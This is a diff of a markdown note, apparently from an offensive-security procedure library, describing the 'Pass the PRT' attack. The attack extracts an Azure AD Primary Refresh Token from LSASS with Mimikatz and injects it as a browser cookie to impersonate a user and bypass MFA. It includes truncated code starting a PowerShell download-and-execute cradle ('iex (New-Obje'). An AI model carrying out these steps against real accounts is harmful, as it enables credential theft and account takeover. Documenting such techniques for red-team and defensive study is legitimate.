@@ -39,9 +39,15 @@ Pass the PRT is a technique used to steal user credentials from Azure Active Dir
 
 Pass the PRT is a technique used to steal user credentials from Azure Active Directory (AAD) with a users machine. This procedure involves using Mimikatz to extract the PRT, KeyValue, Context, ClearKey, and DerivedKey from the targeted user's machine and generate a session cookie for the browser.
 
+
+
 The business value of this procedure is that it allows an attacker to gain access to sensitive data stored in Azure resources, such as confidential documents or customer data.
 
+
+
 PRT is stored in the LSASS and can be extracted usiung an LSASS dump tool (mimikatz) from an AD joined machine.
+
+ 
 
 ## Requirements
 
@@ -59,6 +65,8 @@ PRT is stored in the LSASS and can be extracted usiung an LSASS dump tool (mimik
 
 1. Regularly review and rotate Azure access keys
 
+ 
+
 ## Objectives
 
 1. Extract the PRT from LSASS
@@ -73,9 +81,15 @@ PRT is stored in the LSASS and can be extracted usiung an LSASS dump tool (mimik
 
 1. Import the cookie into a chrome browser session to authenticate as that user. (Bypass MFA)
 
+ 
+
 # Instructions
 
 1. Check if the machine has a Primary Refresh Token (PRT). AzureAdPrt must equal YES to continue / AzureAdJoined equal to YES.
+
+
+
+
 
 **Command** ([[Display AzureAD status]]):
 
@@ -83,12 +97,26 @@ PRT is stored in the LSASS and can be extracted usiung an LSASS dump tool (mimik
 dsregcmd.exe /status
 ```
 
+
+
+
+
+
+
 2. On the user machine run the following to obtain a Primary Refresh Token (PRT):
+
+
 
 **Code**: [[# Run mimikatz to obtain the PRT
 PS> iex (New-Obje]]
 
+
+
+
+
 3. Inject the PRT session cookie into a browser to use the logged on users authentication:
+
+
 
 *3a. Open a Private browser window (firefox)navigate to https://login.microsoftonline.com. Press Ctrl-Shift-I to open the inspect window.*
 
@@ -102,12 +130,34 @@ PS> iex (New-Obje]]
 
 *3f. Set HttpOnly to True*
 
+
+
+
+
+
+
 **Code**: [[Name: x-ms-RefreshTokenCredential
 Value: [Paste yo]]
 
+
+
+
+
 <u>Browser Window</u>
 
+
+
+![75c89d28-c4af-4937-a596-f6f4a3fefb95.png](_assets/images/Ermis/75c89d28-c4af-4937-a596-f6f4a3fefb95.png)
+
 <u>Inspect Window</u>
+
+
+
+
+
+![df2c64a9-54f0-49e2-902a-8a3fa007db94.png](_assets/images/Ermis/df2c64a9-54f0-49e2-902a-8a3fa007db94.png)
+
+
 
 ## Platforms
 
@@ -137,3 +187,5 @@ Value: [Paste yo]]
 - [[Mimikatz - Credential Manager & DPAPI]]
 - [[Pass The PRT]]
 - [[Windows - DPAPI]]
+
+
